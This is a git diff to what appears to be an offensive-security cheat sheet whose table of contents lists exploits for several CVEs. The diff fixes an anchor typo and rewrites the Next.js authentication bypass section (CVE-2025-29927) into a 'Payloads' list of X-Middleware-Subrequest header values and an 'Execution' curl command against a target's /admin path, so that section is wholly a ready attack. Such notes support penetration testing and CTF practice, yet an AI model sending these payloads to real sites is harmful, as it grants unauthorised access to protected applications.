@@ -176,7 +176,7 @@ Thank you for reading.
   		- [CVE-2023-4911: Looney Tunables LPE](#cve-2023-4911-looney-tunables-lpe)
    		- [CVE-2023-7028: GitLab Account Takeover](#cve-2023-7028-gitlab-account-takeover)
    		- [CVE-2024-4577: PHP-CGI Argument Injection Vulnerability RCE](#cve-2024-4577-php-cgi-argument-injection-vulnerability-rce)
-   		- [CVE-2025-29927: Next.js Authentication Bypass](#cve-2025-29927-nextjs-authenication-bypass)
+   		- [CVE-2025-29927: Next.js Authentication Bypass](#cve-2025-29927-nextjs-authentication-bypass)
    		- [CVE-2025-32463: chwoot sudo LPE](#cve-2025-32463-chwoot-sudo-lpe)
   		- [GodPotato LPE](#godpotato-lpe)
 		- [Juicy Potato LPE](#juicy-potato-lpe)
@@ -8409,8 +8409,20 @@ else:
 
 #### CVE-2025-29927: Next.js Authentication Bypass
 
-```shell
-$ curl -H "X-Middleware-Subrequest: middleware" https://<RHOST>/admin
+### Payloads
+
+```console
+X-Middleware-Subrequest: middleware
+```
+
+```console
+x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
+```
+
+### Execution
+
+```console
+curl -H "X-Middleware-Subrequest: middleware" https://<RHOST>/admin
 ```
 
 #### CVE-2025-32463: chwoot sudo LPE
